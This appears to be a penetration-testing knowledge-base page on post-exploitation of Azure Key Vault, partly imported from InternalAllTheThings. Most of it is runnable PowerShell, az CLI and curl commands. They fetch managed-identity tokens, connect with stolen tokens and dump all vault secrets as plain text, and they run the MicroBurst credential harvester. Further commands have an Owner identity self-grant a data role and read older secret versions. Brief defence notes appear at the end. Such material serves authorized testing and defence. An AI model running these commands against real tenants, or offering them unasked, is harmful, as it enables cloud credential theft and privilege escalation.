---
title: Azure Services - KeyVault
type: technique
tags: [azure, cloud, credentials, reference-import, secrets]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Azure Services - KeyVault

## What it is

Technical reference for **Azure Services - KeyVault** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

Azure Key Vault stores secrets, certificates, and cryptographic keys that applications retrieve at runtime using managed identity tokens or service principal credentials. An attacker who compromises a managed identity or service principal with `Key Vault Secrets User` or higher permissions can query all secrets from the vault using the Key Vault REST API, harvesting database passwords, API keys, and encryption keys in one operation. Key Vault access tokens are obtained from the Instance Metadata Service on Azure VMs or from `$IDENTITY_ENDPOINT` in App Service environments, making any SSRF or RCE on a managed compute resource a path to vault credential extraction.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Access Token

* Keyvault access token

```powershell
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
```

* Connect with the access token

```ps1
PS> $token = 'eyJ0..'
PS> $keyvaulttoken = 'eyJ0..'
PS> $accid = '2e...bc'
PS Az> Connect-AzAccount -AccessToken $token -AccountId $accid -KeyVaultAccessToken $keyvaulttoken
```

## Query Secrets

* Query the vault and the secrets

```ps1
PS Az> Get-AzKeyVault
PS Az> Get-AzKeyVaultSecret -VaultName <VaultName>
PS Az> Get-AzKeyVaultSecret -VaultName <VaultName> -Name Reader -AsPlainText
```

* Extract secrets from Automations, AppServices and KeyVaults

```powershell
Import-Module Microburst.psm1
PS Microburst> Get-AzurePasswords
PS Microburst> Get-AzurePasswords -Verbose | Out-GridView
```

## References

* [Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen](https://www.netspi.com/blog/technical/cloud-penetration-testing/get-azurepasswords/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).

### RBAC-mode vault: an Owner/Contributor identity has NO secret access until it self-grants a data role

Key Vault has two authorization models, and management-plane power does not imply data-plane
access. On a vault with `enableRbacAuthorization=true` (check `az keyvault show -n <v> --query
properties.enableRbacAuthorization`), the ARM roles `Owner`, `Contributor`, and `Virtual Machine
Contributor` do NOT let you read secrets - a `list`/`show` returns `ForbiddenByRbac`
(`Microsoft.KeyVault/vaults/secrets/readMetadata/action ... Assignment: (not found)`). Reading
secrets/keys/certs needs a **data-plane** role: `Key Vault Secrets User` (read), `Key Vault Secrets
Officer`, or `Key Vault Administrator`.

The escalation: any principal with `Microsoft.Authorization/roleAssignments/write` at or above the
vault scope - i.e. **Owner** or **User Access Administrator** - can assign itself that data role, then
read. This turns "Owner on the resource group that contains a vault" into "all vault secrets", and is
the payoff when a compromised managed identity (token from IMDS via `az login --identity`) turns out
to be Owner on its RG:

```bash
VID=$(az keyvault show -n <vault> --query id -o tsv)
RA=$(az role assignment create --assignee-object-id <my-oid> --assignee-principal-type ServicePrincipal \
     --role "Key Vault Secrets User" --scope "$VID" --query id -o tsv)   # Owner/UAA can do this
sleep 30                                                                 # RBAC propagation
az keyvault secret list  --vault-name <vault> -o table
az keyvault secret show  --vault-name <vault> -n <name> --query value -o tsv
az role assignment delete --ids "$RA"                                    # revert (leave as found)
```

Access-policy vaults (`enableRbacAuthorization=false`) differ: there `Contributor` can add itself to
`accessPolicies` via `az keyvault set-policy` (an ARM write, no RBAC data role needed). Either way,
management-plane control of a vault is one write away from its secrets. See [[azure-ad-iam]].

<!-- promoted-slug: keyvault-rbac-owner-selfgrant -->

## Rotated != removed: read a prior secret version (+ SP-cred REST data-plane access)

Two deltas for a leaked service principal / managed identity holding `Key Vault Secrets User`
(get/list), beyond the IMDS-token path already on this page.

**1. Data-plane token from SP client-credentials over pure REST** (no IMDS, no `az` needed):

```bash
TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d grant_type=client_credentials -d client_id=<appid> \
  --data-urlencode client_secret='<secret>' -d scope=https://vault.azure.net/.default \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
curl -s "https://<vault>.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $TOKEN"
```

**2. Secret-version rollback.** Rotating a secret creates a NEW version but leaves the prior versions
enabled and readable with the same `get` permission. If a current value looks like a decoy or a
freshly rotated placeholder, pull the history: the real value is often the version just before it.

```bash
az keyvault secret list-versions --vault-name <vault> -n <name> -o table    # oldest .. newest
az keyvault secret show --vault-name <vault> -n <name> --version <oldVersionId> --query value -o tsv
# REST equivalent:
curl -s "https://<vault>.vault.azure.net/secrets/<name>/versions?api-version=7.4" -H "Authorization: Bearer $TOKEN"
curl -s "https://<vault>.vault.azure.net/secrets/<name>/<versionId>?api-version=7.4" -H "Authorization: Bearer $TOKEN"
```

Defence: on rotation, DISABLE or destroy the superseded version; `get` permission alone should not
expose retired secret values. See [[azure-services-storage-blob]].

<!-- promoted-slug: azure-keyvault-secret-version-rollback -->
